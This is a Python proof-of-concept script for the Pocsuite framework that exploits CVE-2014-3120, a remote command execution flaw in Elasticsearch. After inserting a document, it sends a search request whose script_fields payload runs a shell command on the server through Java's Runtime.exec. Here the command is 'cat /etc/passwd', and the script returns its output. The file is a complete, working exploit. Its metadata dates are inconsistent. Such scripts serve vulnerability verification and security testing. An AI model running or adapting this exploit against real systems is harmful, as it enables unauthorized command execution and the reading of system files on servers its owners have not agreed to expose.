#!/usr/bin/env python
# coding: utf-8
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import json
from pocsuite.api.request import req  # 用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '1'                     # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1.0'                 # 默认为1.0
    author = 'Antiy'                # PoC作者的大名
    vulDate = '2018-05-24'          # 漏洞公开的时间,不知道就写今天
    createDate = '2020-11-06'       # 编写 PoC 的日期
    updateDate = '2018-11-06'       # PoC 更新的时间,默认和编写时间一样
    references = ['https://www.waitalone.cn/elasticsearch-exp.html', 'http://zone.wooyun.org/content/18915']  # 漏洞地址来源,0day不用写
    name = 'ElasticSearch RCE'      # PoC 名称
    appPowerLink = 'https://www.elastic.co/cn/elasticsearch/'  # 漏洞厂商主页地址
    appName = 'Elasticsearch'       # 漏洞应用名称
    appVersion = '1.1.1'            # 漏洞影响版本
    vulType = 'RCE'                 # 漏洞类型,类型参考见 漏洞类型规范表
    desc = 'CVE-2014-3120 ElasticSearch 远程命令执行漏洞.'  # 漏洞简要描述
    samples = []                    # 测试样列,就是用 PoC 测试成功的网站
    defaultPorts = [9200]
    defaultService = ['es', 'elasticsearch', 'wap-wsp?', 'wap-wsp']

    def parse_target(self, target, default_port):
        """
        # 172.31.50.177
        # 172.31.50.177:8081
        # http://172.31.50.177
        # http://172.31.50.177:8081
        # ftp://172.31.50.177:21
        # https://172.31.50.177:443
        # https://zan71.com
        # ftp://zan71.com:21
        ;;return schema://address:port
        ;;parmas address: IP/Domain
        """
        # 分割协议
        schema = 'http'
        port = default_port
        address = ''
        if '://' in target:
            slices = target.split('://')
            schema = slices[0]
            target = slices[1]
        if ':' in target:
            slices = target.split(':')
            address = slices[0]
            port = slices[1]
        else:
            address = target
        return {'schema': schema, 'address': address, 'port': int(port)}

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        cmd = "cat /etc/passwd"
        target = self.parse_target(self.target, 9200)
        target_ip = target['address']
        target_port = target['port']
        schema = target['schema']
        headers = {
            'Host': '{}:{}'.format(target_ip, target_port),
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'Connection': 'close',
            'Content-Type': 'application/json',
            'Content-Length': '25',
        }
        # 插入数据
        payload = {"name": "phithon"}
        req.post(url='{}://{}:{}/website/blog/'.format(schema, target_ip, target_port), headers=headers, data=json.dumps(payload))
        # 查询
        headers.update({"Content-Length": '343'})
        payload = {
            "size": 1,
            "query": {
                "filtered": {
                    "query": {
                        "match_all": {}
                    }
                }
            },
            "script_fields": {
                "command": {
                    "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"" + cmd + "\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                }
            }
        }
        resp = req.post(url='{}://{}:{}/_search?pretty'.format(schema, target_ip, target_port), headers=headers, data=json.dumps(payload))
        if resp:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = '{}://{}:{}/_search?pretty'.format(schema, target_ip, target_port)
            result['VerifyInfo']['Command'] = cmd
            result['VerifyInfo']['Result'] = json.loads(resp.text)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
